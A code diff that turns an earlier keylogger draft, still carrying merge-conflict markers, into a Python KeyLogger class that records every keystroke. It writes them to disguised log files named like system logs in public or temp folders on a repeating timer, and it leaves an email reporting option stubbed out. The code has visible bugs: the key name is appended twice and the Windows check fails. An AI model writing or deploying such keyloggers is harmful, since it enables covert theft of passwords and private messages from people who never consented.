@@ -1,31 +1,83 @@
-from pynput.keyboard import Key, Listener
+import keyboard
+import smtplib
 import platform
-import sys
-import logging
+from threading import Timer
+from datetime import datetime
 
-<<<<<<< HEAD
-win_dir = r"C:/users/public/roaming"
-lin_dir = r"/tmp"
-log_dir = win_dir
+#   Three days
+REPORT_TIMING = 3
+WIN_DIR = r"C:\Users\Public\Roaming\system_log78563"
+LIN_DIR = r"/tmp/sytem_log78563"
 
-if platform.system() == 'Linux':
-    log_dir = lin_dir
+class KeyLogger:
+    def __init__(self, interval=REPORT_TIMING, report_method="none"):
+        self.interval = interval
+        self.log = ""
+        self.report_method = report_method
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
 
-=======
-log_dir = r"C:/users/public/roaming/"
->>>>>>> 56629542c5f8c904449d3c7642e86972a3a4dbf6
+    def callback_trigger(self, event):
+        """
+        Method is triggered every time there is a keystoke registers
+        """
+        name = event.name
+        if name == "space":
+            self.log += " "
+        elif name == "enter":
+            self.log += "\n"
+        elif name == "backspace":
+            self.log = self.log[:-1]
+        elif name == "decimal":
+            self.log += "."
+        elif name == "tab":
+            self.log += ""
+        elif name == "left":
+            pass
+        elif name == "right":
+            pass
+        elif name == "up":
+            pass
+        elif name == "down":
+            pass
+        else:
+            self.log += name.replace(" ", "_")
 
-try:
-    logging.basicConfig (
-                        filename=(log_dir+"/systemprivate-5081219092021.txt",
-                        format='%(asctime)s: %(message)s'
-                        )
-except FileNotFoundError:
-    print("File Path DNE. Terminating ...")
-    sys.exit(0)
+        self.log += name
 
-def keyPress(key):
-    logging.info(str(key))
+    def report_to_file(self):
+        #   Open file in write mode
+        log_dir = "log"
 
-with Listener(keyPress=keyPress) as listener:
-    listener.join()
+        if (platform.platform() == "Windows"):
+            log_dir = WIN_DIR
+        else:
+            log_dir = LIN_DIR
+
+        with open(f"{log_dir}.log", "w") as f:
+            print(self.log, file=f)
+
+    def report(self):
+        """
+        This function is called every interval to report the logger findings
+        """
+        if self.log:
+            if self.report_method == "none":
+                self.report_to_file()
+
+            if self.report_method == "email":
+                self.log = ""
+
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback_trigger)
+        self.report()
+        keyboard.wait()
+
+if __name__ == "__main__":
+    keylogger = KeyLogger()
+    keylogger.start()
